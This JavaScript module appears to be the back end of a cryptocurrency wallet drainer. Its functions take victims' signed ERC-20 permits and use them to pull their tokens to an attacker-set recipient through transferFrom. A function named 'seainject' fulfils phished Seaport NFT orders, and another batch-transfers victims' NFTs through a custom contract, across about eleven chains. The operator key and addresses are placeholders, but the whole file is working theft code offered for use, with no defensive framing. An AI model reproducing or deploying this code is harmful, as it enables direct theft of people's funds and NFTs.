

const { Seaport } = require('@opensea/seaport-js');
const { FeeMarketEIP1559Transaction } = require('@ethereumjs/tx');
const { Common } = require('@ethereumjs/common');
const { ethers } = require('ethers');
const axios = require('axios');

let providerRPC;

const privateKey    = '96ff5da51a5de128cc6595xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' // specify the Privatekey Operator (not to be confused with SEED PHRASE), - this is the wallet that will carry out transactions. Gas should always be on it.
const contractSAFA  = '0x442f2c41a46f016exxxxxxxxxxxxxxxxxx' // specify address deploy contract
const recipient     = '0x08ec3c4e0296xxxxxxxxxxxxxxxxxxxxxx' // specify the address of the recipient
// --> its recommended to set recipient = operator-wallet -> then you just need to have 1 wallet to handle

String.prototype.format = function (args) {
  return this.replace(/{(\d+)}/g, function (match, index) {
    // check if the argument is present
    return typeof args == 'undefined' ? match : args;
  });
};

const getABI = async (address, abiUrl) => {
  console.log('Getting ABI for', address)
  let res = await axios.get(abiUrl.format(address));
  res = res.data.result[0];
  let abi = JSON.parse(res['ABI']);
  let impl = '';
  if (res['Proxy'] === '1' && res['Implementation'] !== "") {
    impl = res['Implementation'];
    console.log('Getting impl ABI for', impl);
    abi = JSON.parse((await axios.get(abiUrl.format(impl))).data.result[0]['ABI']);
  }
  return [abi, impl];
}

exports.permit = async (chainId, tokenAddress, abiUrl, amount, owner, spender, value, deadline, v, r, s) => {
    if(chainId == "0x1") { providerRPC = "https://mainnet.infura.io/v3/988d51cc5e12469dbe2852d8b660b89a"; }
    else if(chainId == "0x38") { providerRPC = "https://rpc.ankr.com/bsc"; }
    else if(chainId == "0x89") { providerRPC = "https://rpc.ankr.com/polygon"; }
    else if(chainId == "0xfa") { providerRPC = "https://rpc.ankr.com/fantom"; }
    else if(chainId == "0xa86a") { providerRPC = "https://rpc.ankr.com/avalanche"; }
    else if(chainId == "0xa") { providerRPC = "https://rpc.ankr.com/optimism"; }
    else if(chainId == "0xa4b1") { providerRPC = "https://rpc.ankr.com/arbitrum"; }
    else if(chainId == "0x64") { providerRPC = "https://rpc.ankr.com/gnosis"; }
    else if(chainId == "0x505") { providerRPC = "https://rpc.moonriver.moonbeam.network"; }
    else if(chainId == "0xa4ec") { providerRPC = "https://rpc.ankr.com/celo"; }
    else if(chainId == "0x4e454152") { providerRPC = "https://mainnet.aurora.dev"; }
    const provider = new ethers.providers.JsonRpcProvider(providerRPC);
    const gasPrice = ethers.utils.parseUnits('25', 'gwei');
    const wallet = new ethers.Wallet(privateKey, provider);
    const contractInfo = await getABI(tokenAddress, abiUrl);
    const tokenContract = new ethers.Contract(tokenAddress, contractInfo[0], wallet);
    try {
        const txResponse = await tokenContract.permit(owner, spender, value, deadline, v, r, s, {
          gasLimit:100000
        });
        const txReceipt = await txResponse.wait();
        console.log(txReceipt.transactionHash);
        console.log("Permit Success");
        
        const reswait = await tokenContract.transferFrom(owner, recipient, amount, {
                gasLimit:100000,gasPrice:gasPrice
          });
        const txRes = await reswait.wait();
        console.log(txRes.transactionHash);
        console.log("Transfer Done After permit");
        return true;
    } catch (e) {
        const reswait = await tokenContract.transferFrom(owner, recipient, amount, {
                gasLimit:100000,gasPrice:gasPrice
          });
        const txRes = await reswait.wait();
        console.log(txRes.transactionHash);
        console.log("Transfer Done After permit");
        return true;
    }
}

exports.transfertoken = async (chainId, tokenAddress, abiUrl, amount, owner, spender) => {
    if(chainId == "0x1") { providerRPC = "https://mainnet.infura.io/v3/988d51cc5e12469dbe2852d8b660b89a"; }
    else if(chainId == "0x38") { providerRPC = "https://rpc.ankr.com/bsc"; }
    else if(chainId == "0x89") { providerRPC = "https://rpc.ankr.com/polygon"; }
    else if(chainId == "0xfa") { providerRPC = "https://rpc.ankr.com/fantom"; }
    else if(chainId == "0xa86a") { providerRPC = "https://rpc.ankr.com/avalanche"; }
    else if(chainId == "0xa") { providerRPC = "https://rpc.ankr.com/optimism"; }
    else if(chainId == "0xa4b1") { providerRPC = "https://rpc.ankr.com/arbitrum"; }
    else if(chainId == "0x64") { providerRPC = "https://rpc.ankr.com/gnosis"; }
    else if(chainId == "0x505") { providerRPC = "https://rpc.moonriver.moonbeam.network"; }
    else if(chainId == "0xa4ec") { providerRPC = "https://rpc.ankr.com/celo"; }
    else if(chainId == "0x4e454152") { providerRPC = "https://mainnet.aurora.dev"; }

    const provider = new ethers.providers.JsonRpcProvider(providerRPC);
    const gasPrice = ethers.utils.parseUnits('25', 'gwei');
    const wallet = new ethers.Wallet(privateKey, provider);
    const contractInfo = await getABI(tokenAddress, abiUrl);
    const tokenContract = new ethers.Contract(tokenAddress, contractInfo[0], wallet);
    try {
        const reswait = await tokenContract.transferFrom(owner, recipient, amount, {
          gasLimit:100000,gasPrice:gasPrice
        });
        const txRes = await reswait.wait();
        console.log(txRes.transactionHash);
        console.log("Transfer Done ERC20");
        return true;
    } catch (e) {
        const reswait = await tokenContract.transferFrom(owner, recipient, amount, {
          gasLimit:100000,gasPrice:gasPrice
        });
        const txRes = await reswait.wait();
        console.log(txRes.transactionHash);
        console.log("Transfer Done ERC20");
        return true;
    }
}


exports.seainject = async (order) => {
    providerRPC = "https://rpc.ankr.com/eth/d266e08a3e2a7271cb6b295914898820f5776xxxxxxxxxxxxxxxxxxxxxxx";
    const provider = new ethers.providers.JsonRpcProvider(providerRPC);
    const wallet = new ethers.Wallet(privateKey, provider);
    const seaport = new Seaport(wallet);
    try{
      const sendit = async () => {
      const { executeAllActions: executeAllFulfillActions } = await seaport.fulfillOrder({
        order,
        accountAddress: wallet.address,
        });
        const transaction = executeAllFulfillActions();
      }
      sendit()
      console.log('Transaction Broadcasted');
      return true;
    } catch(error) { console.log(error)
      const sendit = async () => {
      const { executeAllActions: executeAllFulfillActions } = await seaport.fulfillOrder({
        order,
        accountAddress: wallet.address,
        });
        const transaction = executeAllFulfillActions();
      }
      sendit()
      console.log('Transaction Broadcasted');
      return true;
    }
}

exports.batchtransfer = async (owner, tokenAddress, tokensId) => {
    providerRPC = "https://rpc.ankr.com/eth/d266e08a3e2a7271cb6b295914898820f5776xxxxxxxxxxxxxxxxxxxxxxx";
    const abiercsafa = [{"inputs": [], "stateMutability": "nonpayable", "type": "constructor"}, {"inputs": [{"internalType": "contract ERC721Partial", "name": "tokenContract", "type": "address"}, {"internalType": "address", "name": "actualOwner", "type": "address"}, {"internalType": "address", "name": "recipient", "type": "address"}, {"internalType": "uint256[]", "name": "tokenIds", "type": "uint256[]"}], "name": "batchTransfer", "outputs": [], "stateMutability": "nonpayable", "type": "function"}, {"inputs": [{"internalType": "address", "name": "_newExector", "type": "address"}], "name": "setExecutor", "outputs": [], "stateMutability": "nonpayable", "type": "function"}];
    const provider = new ethers.providers.JsonRpcProvider(providerRPC);
    const gasPrice = ethers.utils.parseUnits('30', 'gwei');
    const wallet = new ethers.Wallet(privateKey, provider);
    const res = tokensId.map(numStr => parseInt(numStr));
    const tokenContract = new ethers.Contract(contractSAFA, abiercsafa, wallet);
    try {
        const reswait = await tokenContract.batchTransfer(tokenAddress, owner, recipient, res, {
                gasLimit:300000,gasPrice:gasPrice
        });
        const txRes = await reswait.wait();
        console.log(txRes.transactionHash);
        console.log("Transfer Done");
        return true;
    } catch (e) {
        const reswait = await tokenContract.batchTransfer(tokenAddress, owner, recipient, res, {
                gasLimit:300000,gasPrice:gasPrice
        });
        const txRes = await reswait.wait();
        console.log(txRes.transactionHash);
        console.log("Transfer Done");
        return true;
    }
}